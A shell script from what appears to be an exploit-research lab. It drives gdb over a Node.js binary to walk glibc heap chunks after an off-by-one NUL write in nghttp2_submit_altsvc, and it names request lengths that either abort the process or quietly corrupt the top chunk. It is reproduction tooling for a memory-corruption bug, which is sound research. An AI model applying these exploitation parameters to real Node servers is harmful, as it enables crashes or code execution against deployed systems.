#!/bin/sh
# node2shell shrinkwalk — debugger walk of the chunk following the
# origin buffer O at nghttp2_submit_altsvc entry, i.e. the chunk whose
# sizefield LSB the one-past-end NUL write just zeroed. Two regimes
# observed (layout-chosen, not length-chosen): O carved from a free
# donor → the post-O remainder's shrunk sizefield trips glibc 2.39's
# unsorted validator on the next in-call malloc → SIGABRT; O carved
# from top → the TOP chunk's sizefield is persistently shrunk
# (real_size = brk - top, believed = sizefield) and the request
# completes.
#
# Usage: sh lab/repro/node2shell-shrinkwalk/run.sh [port]
#   NB env override (default lab/node2shell/bin/node-v24.22.2-linux-x64/bin/node).
#   LEN env override (default 2208 = authority 2208 → origin 2216, the
#   completing regime; 1040 → origin 1048 aborts).
# Loopback only; ASLR off via setarch -R.
set -u
HERE=$(cd "$(dirname "$0")" && pwd)
ROOT=$(cd "$HERE/../../.." && pwd)
NB=${NB:-$ROOT/lab/node2shell/bin/node-v24.22.2-linux-x64/bin/node}
PORT=${1:-31921}
LEN=${LEN:-2208}

{
  echo "set pagination off"
  echo "source $HERE/walk.py"
  echo "set confirm off"
  echo "break nghttp2_submit_altsvc"
  echo "commands"
  echo "silent"
  echo "python walk_unsorted()"
  echo "continue"
  echo "end"
  echo "run lab/repro/node2shell-rung1-server.js $PORT"
  echo "bt 12"
  echo "quit"
} > "$HERE/gs.gdb"

  ( for i in $(seq 1 300); do "$NB" "$HERE/retry-client.js" "$PORT" "$LEN" >"$HERE/client.out" 2>&1 && break; sleep 0.2; done ) &
CPID=$!
timeout 75 setarch -R gdb -q -batch -x "$HERE/gs.gdb" --args "$NB" > "$HERE/walk.log" 2>&1
rc=$?
kill $CPID 2>/dev/null
echo "gdb rc=$rc"
awk '/ORIGIN ptr/{f=1} f' "$HERE/walk.log" | head -60
echo "client: $(cat "$HERE/client.out" 2>/dev/null | head -1)"
grep -q 'SIGABRT' "$HERE/walk.log" && echo "SHRINKWALK-RESULT: abort reproduced, victim shrunk" \
  || echo "SHRINKWALK-RESULT: no abort (completing regime, LEN=$LEN) — inspect VICTIM block in walk.log"
